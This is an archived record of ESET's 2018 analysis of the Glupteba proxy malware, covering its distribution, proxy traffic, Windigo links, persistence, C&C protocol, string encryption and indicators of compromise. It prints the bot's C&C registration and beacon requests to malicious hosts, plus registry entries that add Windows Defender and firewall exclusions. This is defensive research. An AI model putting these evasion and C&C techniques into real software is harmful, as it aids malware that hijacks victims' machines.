{
    "id": "96119c9e-07ba-4eb2-bfc3-3585640a3f91",
    "created_at": "2023-01-12T15:02:27.78921Z",
    "updated_at": "2025-03-27T02:13:50.575622Z",
    "deleted_at": null,
    "sha1_hash": "c302db00cc6bf5147bda783cac7ad5e70097342b",
    "title": "2018-03-22 - Glupteba is no longer part of Windigo",
    "authors": "",
    "file_creation_date": "2022-05-29T01:08:07Z",
    "file_modification_date": "2022-05-29T01:08:07Z",
    "file_size": 765687,
    "plain_text": "# Glupteba is no longer part of Windigo\n\n**welivesecurity.com/2018/03/22/glupteba-no-longer-windigo/**\n\nLatest ESET research strongly suggests that Glupteba is no longer tied to the infamous Operation Windigo.\n\n[Frédéric Vachon](https://www.welivesecurity.com/author/fvachon/)\n22 Mar 2018 - 02:57PM\n\nLatest ESET research strongly suggests that Glupteba is no longer tied to the infamous Operation Windigo.\n\n\nMarch 22, 2018\n\n\n[Our recent research on Linux/Ebury, the core component of Operation Windigo, led us to look at other components in](https://www.welivesecurity.com/2017/10/30/windigo-ebury-update-2/)\nWindigo’s ecosystem to see if they are still active and part of the same operation. During this process, we took a look at\nWin32/Glupteba, an open proxy previously distributed by exploit kits deployed as part of Operation Windigo. The result of\nour latest analysis strongly suggests that Glupteba is no longer tied to Operation Windigo.\n\nIn this blog post, we share the results of our investigation. We provide information about the current distribution\nmechanisms of Glupteba, a short analysis of the network traffic going through the proxy, and we discuss the relationship\nbetween Glupteba and Windigo. Finally, we give a technical analysis of the current state of the Glupteba binary.\n\n\n-----\n\n## Glupteba distribution over time\n\n### Brief history\n\nOver time, Glupteba is known to have used various distribution methods. ESET researchers have tracked the distribution\nof Glupteba for the last seven years. We’ll give a brief overview of its evolution.\n\n[Back in 2011, ESET researchers working on the infamous TDL-4 bootkit discovered that, as explained in this blogpost, it](https://en.wikipedia.org/wiki/Alureon)\nwas being used as a downloader to fetch additional malware. Glupteba was found to be one of many malware variants it\ninstalled. TDL-4 operators were most likely selling a distribution service on black markets.\n\nThree years later, ESET’s investigation into Operation Windigo revealed that part of the attackers’ infrastructure of\ncompromised Linux servers was used to redirect a certain proportion of HTTP requests through trojanized instances of\nweb servers (Apache httpd, lighttpd and nginx). Redirected requests would hit DNS servers under the control of Windigo’s\noperators, which resolved the A record to the IP address of the final redirection targets. These usually hosted exploit kits.\nUpon successful exploitation, Glupteba would be installed.\n\nThe ties between Windigo and Glupteba didn’t end there. Glupteba’s C&C servers were also hosted on machines that\nwere part of Windigo’s botnet. Furthermore, the sole purpose of Glupteba at the time was to relay spam jobs fetched from\nWindigo’s infrastructure. It is, however, hard to say if Glupteba was operated by the same individuals as the Windigo\nbotnet or if it was some kind of service provided by Windigo’s operators reselling usage of their infrastructure.\n\n### Current distribution scheme\n\nOnce again, Glupteba’s distribution vector changed. It is not distributed via Windigo’s infrastructure anymore. Glupteba is\nnow part of its own botnet and is distributed by MSIL/Adware.CsdiMonetize.AG, which is used to install many different\nmalware families – suggesting a Pay-Per-Install scheme. In addition to installing Glupteba, we’ve seen it deploying\nAdware, Bitcoin mining agents and various PUAs (Potentially Unwanted Applications). MSIL/Adware.CsdiMonetize.AG\ndoesn’t directly install Glupteba.AY; instead it downloads its dropper, which is responsible for registering the bot to its\nC&C, adding exclusions to Windows Defender and the Windows firewall as well as setting the environment to install\nGlupteba.\n\nThe query to register the bot contains multiple pieces of information about the victim’s machine. Here’s an example of\nsuch a query:\n\nPOST /bots/register HTTP/1.1\n\nHost: burnandfire5.com\n\nUser-Agent: Go-http-client/1.1\n\nContent-Length: 400\n\nContent-Type: application/x-www-form-urlencoded\n\nAccept-Encoding: gzip\n\nData[appname]=SolitaryBrook&Data[arch]=32&Data[av]=&Data[build_number]=7601&Data[compaign_id]=&Data[cpu]=\n<CPU_SPEC>&Data[defender]=1&Data[exploited]=1&Data[firewall]=1&Data[gpu]=\n<GPU_INFO>&Data[is_admin]=1&Data[os]=<OS_INFO>&Data[username]=<USERNAME>&Data[version]=71\n\nThe Windows Registry value HKCU\\Software\\Microsoft\\TestApp\\UUID is also created. It is needed by Glupteba to execute\nsuccessfully. This value’s data must not be empty.\n\nFinally, the following registry entries are created to add exclusion rules to Windows Defender and the Windows Firewall:\n\nHKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Users\\<USERNAME>\\AppData\\Roaming\\EpicNet\nInc\\CloudNet = 0HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes\\cloudnet.exe =\n0HKLM\\SYSTEM\\ControlSet001\\services\\SharedAccess\\Parameters\\FirewallPolicy\\FirewallRules\\{09E3DB75-DE774B2D-A351-C745D9A15617} = “v2.10|Action=Allow|Active=TRUE|Dir=In|App=C:\\Users\\\n<USERNAME>\\AppData\\Roaming\\EpicNet Inc\\CloudNet\\cloudnet.exe”\n\n\n-----\n\nAccording to ESET s telemetry, Glupteba has been seen in 180 different countries since the beginning of 2017. Three\ncountries jointly account for 25% of all detections – Ukraine, the Russian Federation and Turkey. Figure 1 shows the\ndistribution per country of the detections we observed.\n\nFigure 1. Distribution of detections per country\n\n## Proxy usage analysis\n\nDuring ESET’s research into Operation Windigo, Glupteba’s sole purpose was to relay spam jobs to their final recipients.\nWe wanted to see if the use of Glupteba has changed since then. During November 2017, we captured network traffic\ngoing through an infected node for a duration of four days. Note that we didn’t decrypt the HTTPS traffic, so our visibility\nwas limited to non-encrypted network protocols. Our analysis showed that Glupteba is no longer limited to sending spam.\nIt is now primarily used by various automated systems. While Glupteba’s operators might use the proxy, we do believe that\nthe use of Glupteba is sold to third-party users as a proxy service. Here, we provide information about the most interesting\ntraffic we observed.\nThe first thing we noticed is that Glupteba is still used to relay spam messages to their final recipients. Here’s an example\nof a spam message:\n\nFrom: “Ella Dmhfey” <Ella87@bilanzgewinn.at>\nTo: “???????” <??????????@gmail.com>\nSubject: ?????????? kaufen Sie Se-xpower\nDate: Fri, 10 Nov 2017 14:18:10 +0100\nMIME-Version: 1.0\nContent-Type: text/plain;\ncharset=”iso-8859-1″\nContent-Transfer-Encoding: 7bit\n\nGuten Tag ?????????,\n\nDamit kriegen Sie Ihre Dame zum Hoehepunkt.\n\n?????????: http://www.sexpillen-versandhaus[.]info/shop\n\nWe’ve also seen Glupteba used to attempt password-reuse attacks. Glupteba provides some level of anonymity to the\nattackers since the IP address of the proxy user is never exposed to the actual targeted server. Moreover, it allows\nspreading the queries across multiple IP addresses, thus reducing the risk of being banned by the website targeted by the\npassword-reuse attack. We’ve seen such attacks performed on three domains:\n\n\n-----\n\n**Table 1. Domains targeted that don’t use HTTPS**\n\n**Domain name** **Short description**\n\nadfoc.us URL shortener service where users are paid per visit\n\nbonusbitcoin.co Free bitcoin faucet website\n\nsocial.tunecore.com Music distribution website\n\n[There are probably more targeted domains. Based on the server_name extension field of the ClientHello structure used](https://tools.ietf.org/html/rfc6066)\nduring the TLS handshake, we know the domain names that were accessed even when HTTPS was used. This gives\ninsight into what websites may have been targeted. Table 2 a list of such domain names along with the associated\nauthentication URLs. They are sorted with the most frequently visited on the top.\n\n**Table 2. Domains in server_name**\n**certificate field**\n\n**Server name** **Authentication URL**\n\nauth.mail.ru https://auth.mail.ru/cgi-bin/auth\n\nwww.instagram.com https://www.instagram.com/accounts/login/ajax/\n\nstore.steampowered.com https://store.steampowered.com/login/dologin/\n\nwww.amazon.com https://www.amazon.com/ap/signin\n\nauth.riotgames.com https://auth.riotgames.com/authz/auth\n\nvk.com https://vk.com/login\n\nglobal.americanexpress.com https://global.americanexpress.com/myca/logon/emea/action\n\nwww.facebook.com https://www.facebook.com/login/device-based/regular/login/\n\nsignin.ea.com https://signin.ea.com/p/web2/login\n\naccount.t-mobile.com https://account.t-mobile.com/svr/authenticate\n\nwww.linkedin.com https://www.linkedin.com/uas/login-submit\n\nwww.westernunion.com https://www.westernunion.com/wuconnect/rest/api/v1.0/CustomerSignOn\n\nwww.paypal.com https://www.paypal.com/signin\n\nwww.britishairways.com https://www.britishairways.com/api/grant\n\nauth.api.sonyentertainmentnetwork.com https://auth.api.sonyentertainmentnetwork.com/login.jsp\n\naccount.sonymobile.com https://account.sonymobile.com/api/ng/signin\n\nwww.expedia.com https://www.expedia.com/user/signin\n\nAnother example of a user proxying automated system traffic through Glupteba targeted www.omegle.com. Omegle is a\nwebsite where two strangers can meet in a private chat room. What we observed is a bot joining a chat room and trying to\ntrick the other user into clicking a link. It seems that this service is a popular target for bots. Most of the interactions we\ncaptured were between two bots trying to lure each other into either joining Kik Messenger, an instant messaging mobile\napp, or clicking shortened URLs that redirect to adult websites.\n\nExample of two bots interacting with each other:\n\n\n-----\n\nguest> heyy\nstranger> my name is Tomasa\nstranger> im female  .\nstranger> from Rio de aneiro,Brazil\nstranger> ready to talk, enter here:\nstranger> bit.ly/<REDACTED>\nguest> 18 female\nguest> wanena etrade picturesh ?\nguest> zyari.site/<REDACTED>\nguest> messsage me theree ill sendc you sxome mor8e\nguest> ok we2ll im goinn 2 getwt off bye\n\nWe’ve also come across bots trying specially crafted HTTP POST requests in an attempt to find webshells. Domains were\ntried one after the other in ascending alphabetical order, which suggests they are programmatically processing a list of\ndomains.\n\n## Discussing links with Windigo\n\nWhen we decided to revisit Glupteba, it was primarily because we wanted to see if it was still associated with Operation\nWindigo; our analysis leads us to believe that the two are no longer affiliated. Let us provide the reasons for such\nconclusions.\n\nThe first thing we looked at is the C&C servers used by Glupteba. Enumerating the IP addresses we found, none of them\nmatched any previously known Ebury-compromised servers. Moreover, the new C&C servers have a lot of ports open,\nwhile the previous ones had only one DNAT and one SNAT rule to reroute the traffic to the actual C&C server. Having so\nmany ports open on a compromised server would be very noisy, which is not the modus operandi of Windigo’s operators.\n\n[As documented in the Operation Windigo whitepaper, the client connecting to Glupteba used to send an HTTP GET](https://www.welivesecurity.com/wp-content/uploads/2014/03/operation_windigo.pdf)\nrequest on port 25 to a machine compromised by Ebury before starting to send spam jobs. This is no longer the case:\nspam jobs go directly through the proxy without any kind of prologue. Also, the spam messages themselves don’t look like\nthose we used to see during Operation Windigo, where the messages led to a dating website. While it could be argued\nthat the current spam messages, trying to sell sexual enhancement pills to “get your lady to the climax”, are a logical\nsequel to the previous one, we believe they are unrelated.\n\nFinally, the distribution itself is not related to Windigo anymore. As mentioned previously, it is now distributed by\nMSIL/Adware.CsdiMonetize.AG.\n\nFor all these reasons, we believe that Glupteba is no longer linked with Operation Windigo.\n\n## Technical analysis\n\nIn this section, we provide a technical analysis of the samples of Glupteba we looked at during this research. The first\nthing we noticed is that the current samples don’t look like those we analyzed back in 2014. We believe Glupteba has\nbeen rewritten from scratch. Whereas Glupteba used to be a fairly small and simple program, nowadays it has become a\nhuge and very complex C++ program. It used to have around 70 functions. Now, it has more than 3600 functions.\n\n\n-----\n\nFigure 2. Functions list comparison\n\n[Glupteba now statically links to the Boost C++ libraries as shown in](http://www.boost.org/) Figure 3. To communicate over sockets, it uses the\nWindows Sockets APIs WSASend and WSARecv instead of send and recv.\n\nFigure 3. Boost C++ library related strings\n\n### Persistence\n\nGlupteba acquires persistence by adding an entry in the Run registry key. Thus, every time Windows boots up, Glupteba\nwill be launched. Here’s the entry that is created:\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\CloudNet = “%APPDATA%\\EpicNet Inc\\CloudNet\\cloudnet.exe”\n\nOther entare also created in the Windows Registry. The most interesting are the following:\n\nHKCU\\Software\\EpicNet Inc.\\CloudNet\\Value = “20180223”\n\nHKCU\\Software\\EpicNet Inc.\\CloudNet\\GUID = “CDC0432A-0298-40B1-9A71-D61F94C013A7”\n\nThe GUID entry is set to the bot id that is created via a call to CoCreateGuid. As for the Value entry, it contains the PE\ntimestamp of Glupteba’s binary.\n\n### C&C communication\n\nFrom a networking perspective, there are no significant changes between the samples we documented in our Operation\nWindigo paper and the current version. When launched, Glupteba sends the same beacon to its C&C and the response\ncontains the session and the port that Glupteba will connect to for retrieval of the proxying jobs. Refer to the earlier\n[whitepaper for more information about the protocol.](https://www.welivesecurity.com/wp-content/uploads/2014/03/operation_windigo.pdf)\n\n\n-----\n\nBeacon sent to the C&C:\n\nGET\n/stat?\nuptime=100&downlink=1111&uplink=1111&id=05AA812F&statpass=bpass&version=20171106&features=30&guid=68794E510DBC-4CF6-BD98-8B18FE3E0A18&comment=20171106&p=0&s= HTTP/1.0\n\nThe C&C servers are stored encrypted in the binary. Once decrypted, they look like this:\n\n‘server-%s.sportpics[.]xyz:30,server-%s.kinosport[.]top:30,’\n\nThe number after the colon is the maximum range of the server numbers. In this case, ’30’ means that there are 30\ndomain names generated by formatting the domain string with numbers from 1 to 30. When contacting the C&C server,\none of those domains is randomly selected and the GUID of the compromised machine is prepended as a subdomain to\nthe chosen server resulting in a domain like this:\n\nExample of a C&C server:\n\n68794E51-0DBC-4CF6-BD98-8B18FE3E0A18.server-1.sportpics[.]xyz\n\nGlupteba also sends a second GET request to its C&C server in order to update information about the victim’s machine\nspecifications. Here’s what the request looks like:\n\nGET\n/update.php?uid=<BOT_ID>&version=<VERSION>&OS=<OS>&have_admin=1&mys=<C&C_SERVERS>&build=\n<PE_TIMESTAMP>&cpu=<CPU>&video=<VIDEO_CARD>&ram=<GB_OF_RAM> HTTP/1.0\n\n### String encryption\n\nGlupteba’s strings are encrypted using a custom algorithm. The decryption process uses a 16-byte key and has three\n[separate phases. The key is different for each build. During the first phase, the Mersenne Twister pseudorandom number](https://en.wikipedia.org/wiki/Mersenne_Twister)\ngenerator (PRNG) is used. The algorithm is seeded with the first four bytes of the key. Then, each byte of the cipher is\nXORed with the next byte generated by the PRNG.\n\nFigure 4. Phase One of the decryption process\n\n[There are three different variants of the second phase. One uses the Rabbit cipher; another uses a second round of XOR](https://en.wikipedia.org/wiki/Rabbit_(cipher))\noperations similar to the one from the first phase, but with a different seed derived from the key. The only variant that is\nused in the samples we analyzed is the third one. It consists of an XOR loop with the key.\n\n\n-----\n\nThe third and final phase is another XOR loop with a value that is computed from the output of the second phase and\nsome immediate values.\n\nFigure 5. Phase Three of the decryption process\n\nIn our [GitHub repository, we provide a script to decrypt all the strings. Since the Mersenne Twister PRNG implementation](https://github.com/eset/malware-research/blob/master/glupteba)\nof Python varies a bit from the one used by Glupteba, we also provide a Python implementation of the PRNG. Make sure\nthe directory where it is located is in your %PYTHONPATH% before launching the string decryption script. You can do so\nby running this command in IDA’s Python interpreter:\n\nsys.path.append(<PATH_TO_SCRIPT>)\n\n## Conclusion\n\nThe Glupteba operators persist in finding ways to distribute their malware despite the relentless efforts of the information\nsecurity community to disrupt their operations. After the exposure of Operation Windigo, they just moved to other tactics to\nget their malware spread to computers all around the globe.\n\nThe complete rewriting of their tools and its current distribution shows that the individuals behind Glupteba are still very\nactive. Such efforts suggest that the open proxy market must be a very lucrative one, and that we’re unlikely to witness the\ndisappearance of Glupteba in the near future.\n\n## IoCs\n\n**File hashes**\n\n\n-----\n\n**File hashes**\n\n**SHA-1** **Filename** **Detection name**\n\nB623F4A6CD5947CA0016D3E33A07EB72E8C176BA cloudnet.exe Win32/Glupteba.AY\n\nED310E5B9F582B4C6389F7AB9EED17D89497F277 cloudnet.exe Win32/Glupteba.AY\n\nF7230B2CAB4E4910BCA473B39EE8FD4DF394CE0D setup.exe MSIL/Adware.CsdiMonetize.AG\n\n70F2763772FD1A1A54ED9EA88A2BCFDB184BCB91 cloudnet.exe Win32/Glupteba.AY\n\n87AD7E248DADC2FBE00D8441E58E64591D9E3CBE cloudnet.exe Win32/Glupteba.AY\n\n1645AD8468A2FB54763C0EBEB766DFD8C643F3DB csrss.exe Win32/Agent.SVE\n\n### Glupteba C&C server domains\n\nserver-{1,30}[.]ostdownload.xyz\nserver-{1,30}[.]travelsreview.world\nserver-{1,30}[.]bigdesign.website\nserver-{1,30}[.]sportpics.xyz\nserver-{1,30}[.]kinosport.top\nserver-{1,30}[.]0ev.ru\nserver-{1,30}[.]0df.ru\nserver-{1,30}[.]0d2.ru\nserver-{1,30}[.]0d9.ru\n\n### Glupteba C&C server IP addresses\n\n5[.]101.6.132\n\n5[.]79.87.139\n\n5[.]79.87.153\n\n5[.]8.10.194\n\n37[.]48.81.151\n\n46[.]165.244.129\n\n46[.]165.249.167\n\n46[.]165.249.195\n\n46[.]165.249.201\n\n46[.]165.249.203\n\n46[.]165.250.25\n\n78[.]31.67.205\n\n78[.]31.67.206\n\n80[.]93.90.27\n\n80[.]93.90.32\n\n80[.]93.90.69\n\n80[.]93.90.72\n\n80[.]93.90.78\n\n80[.]93.90.84\n\n81[.]30.152.25\n\n85[.]114.135.113\n\n85[.]114.141.81\n\n89[.]163.206.137\n\n89[.]163.206.174\n\n89[.]163.212.9\n\n91[.]121.65.98\n\n91[.]216.93.126\n\n91[.]216.93.20\n\n\n-----\n\n109[.]238.10.78\n178[.]162.193.193\n178[.]162.193.195\n178[.]162.193.66\n178[.]162.193.86\n193[.]111.140.238\n193[.]111.141.213\n212[.]92.100.114\n212[.]92.100.115\n213[.]202.254.161\n213[.]5.70.9\n217[.]79.189.227\n\n### Agent.SVE C&C server domains\n\nfinancialtimesguru[.]com\n\ncomburnandfire5[.]com\n\n22 Mar 2018 - 02:57PM\n\n### Sign up to receive an email update whenever a new article is published in our Ukraine Crisis – Digital Security Resource Center\n\n Newsletter\n\n Discussion\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-03-22 - Glupteba is no longer part of Windigo.pdf"
    ],
    "report_names": [
        "2018-03-22 - Glupteba is no longer part of Windigo.pdf"
    ],
    "threat_actors": [
        {
            "id": "3844202f-b24a-4e16-b7b9-dfe8c0a44d5d",
            "created_at": "2022-10-25T16:07:24.526179Z",
            "updated_at": "2025-03-27T02:02:10.27234Z",
            "deleted_at": null,
            "main_name": "Operation Windigo",
            "aliases": [],
            "source_name": "ETDA:Operation Windigo",
            "tools": [
                "CDorked",
                "CDorked.A",
                "Calfbot",
                "Ebury"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "1934b371-2525-4615-a90a-772182bc4184",
            "created_at": "2022-10-25T15:50:23.396576Z",
            "updated_at": "2025-03-27T02:00:55.460522Z",
            "deleted_at": null,
            "main_name": "Windigo",
            "aliases": [
                "Windigo"
            ],
            "source_name": "MITRE:Windigo",
            "tools": [
                "Ebury"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535747,
    "ts_updated_at": 1743041630,
    "ts_creation_date": 1653786487,
    "ts_modification_date": 1653786487,
    "files": {
        "pdf": "https://archive.orkl.eu/c302db00cc6bf5147bda783cac7ad5e70097342b.pdf",
        "text": "https://archive.orkl.eu/c302db00cc6bf5147bda783cac7ad5e70097342b.txt",
        "img": "https://archive.orkl.eu/c302db00cc6bf5147bda783cac7ad5e70097342b.jpg"
    }
}